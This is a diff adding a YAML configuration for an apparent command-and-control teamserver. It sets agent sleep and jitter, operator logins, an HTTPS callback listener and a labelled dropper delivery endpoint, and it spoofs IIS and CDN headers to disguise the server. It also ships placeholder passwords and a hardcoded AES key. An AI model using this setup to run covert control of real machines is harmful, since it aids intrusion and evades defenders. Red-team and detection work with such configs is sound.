@@ -1,0 +1,55 @@
+teamserver:
+  bind:
+    host: "0.0.0.0"      # Admin interface binding address
+    port: 2053           # Admin interface port
+    response_headers:    # Custom headers for disguising server identity
+      - "Server: Microsoft-IIS/8.5"
+      - "X-Powered-By: ASP.NET"
+
+agent:
+  sleep_time: 6          # Time in seconds between agent check-ins
+  jitter: 20             # Random timing variation (percent)
+  debug: false           # Enable/disable debug mode in agent
+
+operators:
+  - name: "operator1"    # Operator username
+    credentials:
+      password: "secure_password"  # Use strong passwords in production
+  - name: "operator2"   
+    credentials:
+      password: "secure_password" 
+
+aes_key:
+  - data:
+      key: "s3cure_AES_Key_Must_Be_32_Chars_Long"  # AES key for encryption (32+ chars)
+
+ssl:
+  enabled: true          # Enable SSL/TLS
+  cert_file: "certs/server.crt"  # Path to certificate
+  key_file: "certs/server.key"   # Path to private key
+  ssl_version: "TLSv1_2"         # SSL/TLS version
+  ciphers: "HIGH:!aNULL:!MD5"    # Cipher configuration
+
+listeners:
+  - id: "main_listener"  # Unique listener identifier
+    profile:
+      description: "Default C2 listener"
+      bind:
+        host: "0.0.0.0"  # Agent listener binding address
+        port: 443        # Agent listener port
+        protocol: "https"  # Communication protocol
+      upstream:
+        hosts:
+          - "your-domain.com"  # Domain (or ip) for agent communications
+      http:
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"      # Agent user-agent
+        uris:
+          - "/account/login"    # Agent communication endpoint
+          - "/search/?q=rvge"   # Dropper delivery endpoint
+        request_headers:        # Custom request headers
+          - "Accept: */*"
+          - "Referer: https://your-domain.com/"
+        response_headers:       # Custom response headers
+          - "content-type: text/html; charset=utf-8"
+          - "server: ESF"
+          - "cf-cache-status: HIT"
